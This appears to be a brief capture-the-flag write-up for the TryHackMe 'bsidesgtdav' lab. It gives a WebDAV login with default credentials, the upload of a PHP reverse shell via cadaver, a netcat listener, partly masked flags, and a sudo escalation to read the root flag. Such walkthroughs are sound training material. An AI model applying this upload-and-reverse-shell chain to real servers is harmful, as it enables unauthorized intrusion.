# bsidesgtdav
Tryhackme (bsidesgtdav) Write Up

webdav default login

http://10.10.135.159/webdav

Username: webdav
Password: xampp


Using (*cadaver*)

put reverse-shell.php

http://10.10.135.159/webdav/reverse-shell.php

nc -lvnp 1234


![image](https://user-images.githubusercontent.com/80600420/147095168-66d56a92-9f49-49f8-9ddd-fbb13fbbdfcf.png)

/home/merlin
$ cat user.txt
```
449b40fe93f78a9***************
```
sudo -l 

![image](https://user-images.githubusercontent.com/80600420/147095353-32624d5f-1498-47ca-a022-5b5d8e1e5cc7.png)

sudo cat /root/root.txt

```
101101ddc16b0c***************
```
